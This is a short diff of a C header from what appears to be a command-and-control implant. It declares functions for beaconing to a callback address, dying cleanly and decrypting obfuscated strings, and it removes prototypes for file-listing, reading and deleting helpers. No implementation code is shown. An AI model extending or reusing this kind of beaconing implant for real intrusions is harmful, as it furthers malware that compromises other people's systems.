@@ -16,13 +16,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 LPVOID DieCleanly();
 LPVOID CheckIfDie(LPCWSTR *ReadBuffer);
 
-char* listdirs(LPCSTR szDir);
-char* readfile(char* szFile);
-char* makedirectory(char* szDirName);
-char* removefile(char* szFileName);
-char* getdir();
-char* changedir(char* Dir);
-
 LPVOID ReportExecutionFail();
 
 char* decrypt_string(char* string, int key);
